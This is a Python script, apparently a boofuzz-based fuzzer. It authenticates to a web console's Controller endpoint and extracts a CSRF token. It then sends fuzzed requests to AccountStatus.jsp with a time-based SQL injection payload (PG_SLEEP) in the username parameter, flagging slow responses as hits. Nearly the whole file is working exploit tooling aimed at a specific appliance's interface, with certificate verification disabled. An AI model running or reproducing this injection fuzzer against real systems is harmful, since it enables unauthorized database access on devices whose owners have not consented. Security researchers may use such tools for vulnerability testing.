from boofuzz import *
import ssl
import sys
import requests
import time
import urllib.parse


t = 0


def ad(target, fuzz_data_logger, session, *args, **kwargs):
    print('=====================================================')
    global t
    if (time.time() - t) > 3:
        print(session.last_send)
        fuzz_data_logger.log_check(session.last_send)

    print('=====================================================')


def en(s):
    ss = urllib.parse.quote(s)
    return ss.encode()


def gt(target, fuzz_data_logger, session, *args, **kwargs):
    global t
    t = time.time()


def main():

    if(len(sys.argv) != 5):
        sys.exit(
            'usage: {} target_ip port username password'.format(sys.argv[0]))

    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    session = Session(target=Target(
        connection=SSLSocketConnection(host=sys.argv[1], port=int(sys.argv[2]), sslcontext=ctx)),
        restart_threshold=1,
        post_test_case_callbacks=[ad],
        receive_data_after_fuzz=True,
        pre_send_callbacks=[gt]
    )

    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecurePlatformWarning)
    try:
        r = requests.post(url='https://{}:{}/webconsole/Controller'.format(
            sys.argv[1], sys.argv[2]), data='mode=151&json=%7B%22username%22%3A%22{}%22%2C%22password%22%3A%22{}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Firefox_87%22%7D&__RequestType=ajax&t='.format(sys.argv[3], sys.argv[4]) + str(int(time.time())) + '999', verify=False, headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'Cookie': 'JSESSIONID=18mil7fgyvfiwl07u4fto1gx42'})
        c = r.cookies.items()[0][1]
        r = requests.get(url='https://{}:{}/webconsole/webpages/index.jsp'.format(sys.argv[1], sys.argv[2]), headers={
                         'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Cookie': 'JSESSIONID={}'.format(c)}, verify=False)
        s = r.text.find('c$rFt0k3n')
        e = r.text[s:].find(';')
        token = r.text[s + 13:s + e - 1]

    except Exception as e:
        print(e)

    s_initialize('ff')
    s_static('GET /webconsole/webpages/myaccount/AccountStatus.jsp?username=test')
    with s_block('data', encoder=en):
        s_delim(' ')
        s_delim(' ')
    s_static('%3bSELECT%20PG_SLEEP(5)--')
    s_static('&popup=1 HTTP/1.1\r\n')
    s_static('Host: {}:{}\r\n'.format(sys.argv[1], sys.argv[2]))
    s_static('User-Agent: Mozilla/5.0\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n')
    s_static(
        'Referer: https://{}:{}/webconsole/webpages/index.jsp\r\n'.format(sys.argv[1], sys.argv[2]))
    s_static('X-CSRF-Token: {}\r\n'.format(token))
    s_static('Cookie: JSESSIONID={}\r\n\r\n'.format(c))

    session.connect(s_get('ff'))
    session.fuzz()


if __name__ == '__main__':
    main()
